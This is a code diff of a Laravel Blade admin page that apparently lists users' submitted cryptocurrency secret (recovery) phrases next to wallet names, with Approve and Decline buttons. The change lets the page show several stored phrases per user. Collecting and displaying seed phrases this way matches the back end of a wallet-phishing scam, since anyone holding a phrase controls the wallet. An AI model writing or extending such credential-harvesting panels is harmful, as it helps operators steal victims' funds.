@@ -144,27 +144,48 @@
                 <br>
 
                 <div class="form-group my-3">
-                    @if($user->phrase)
+                @if($user->phrase)
                     @php
-                        $phrase = json_decode($user->phrase, true);
+                        $phraseData = json_decode($user->phrase, true);
+
+                        // Check if it's a single object and convert it to an array if needed
+                        if (isset($phraseData['phrase']) && isset($phraseData['wallet'])) {
+                            $phraseData = [$phraseData];
+                        }
                     @endphp
-                    <label>Secret Phrase <span class="badge {{ $phrase['status'] == 1 ? 'bg-success' : 'bg-secondary' }}">{{ $phrase['status'] == 1 ? 'approved' : 'Waiting...' }}</span></label>
-                    <textarea name="..." id="" disabled rows="10" cols="3" class="form-control mb-2 mt-2">{{ $phrase['phrase'] }} - {{ $phrase['wallet'] }}</textarea>
-                        <div class="d-flex justify-content-around">
-                            <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 1]) }}" method="post">
-                                @csrf
-                                <input type="hidden" value="{{ $phrase['phrase'] }}" name="phrase" id="phrase">
-                                <input type="hidden" value="{{ $phrase['wallet'] }}" name="wallet" id="phrase">
-                                <button type="submit" class="btn btn-success">Approve</button>
-                            </form>
-                            <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 0]) }}" method="post">
-                                @csrf
-                                <input type="hidden" value="{{ $phrase['phrase'] }}" name="phrase" id="phrase">
-                                <input type="hidden" value="{{ $phrase['wallet'] }}" name="wallet" id="phrase">
-                                <button type="submit" class="btn btn-danger">Decline</button>
-                            </form>
-                        </div>
-                    @endif
+
+                    <label>Secret Phrase 
+                        <span class="badge {{ $phraseData[0]['status'] == 1 ? 'bg-success' : 'bg-secondary' }}">
+                            {{ $phraseData[0]['status'] == 1 ? 'Approved' : 'Waiting...' }}
+                        </span>
+                    </label>
+                    
+                    <div rows="10" cols="3" class="form-control mb-2 mt-2 bg-muted" style="min-height: 230px; background: #f0f0f0;">
+                        <ul>
+                            @foreach($phraseData as $ph)
+                                <li>{{ $ph['phrase'] }} - {{ $ph['wallet'] }}</li>
+                            @endforeach
+                        </ul>
+                    </div>
+
+                    <div class="d-flex justify-content-around">
+                        <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 1]) }}" method="post">
+                            @csrf
+                            <input type="hidden" value="{{ $phraseData[0]['phrase'] }}" name="phrase">
+                            <input type="hidden" value="{{ $phraseData[0]['wallet'] }}" name="wallet">
+                            <button type="submit" class="btn btn-success">Approve</button>
+                        </form>
+
+                        <form action="{{ route('update.phrase', ['id' => $user->id, 'status' => 0]) }}" method="post">
+                            @csrf
+                            <input type="hidden" value="{{ $phraseData[0]['phrase'] }}" name="phrase">
+                            <input type="hidden" value="{{ $phraseData[0]['wallet'] }}" name="wallet">
+                            <button type="submit" class="btn btn-danger">Decline</button>
+                        </form>
+                    </div>
+                @endif
+
+
                 </div>
                 <br>
                 <hr>
